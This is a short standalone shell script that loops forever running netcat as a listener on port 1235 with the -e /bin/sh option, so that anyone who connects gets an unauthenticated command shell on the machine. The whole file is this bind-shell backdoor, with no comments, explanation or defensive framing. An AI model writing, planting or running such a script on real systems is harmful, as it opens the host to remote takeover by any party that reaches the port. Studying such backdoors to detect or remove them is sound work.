#!/bin/sh
while [ true ]
do
	/bin/nc -l -l -p 1235 -e /bin/sh
done
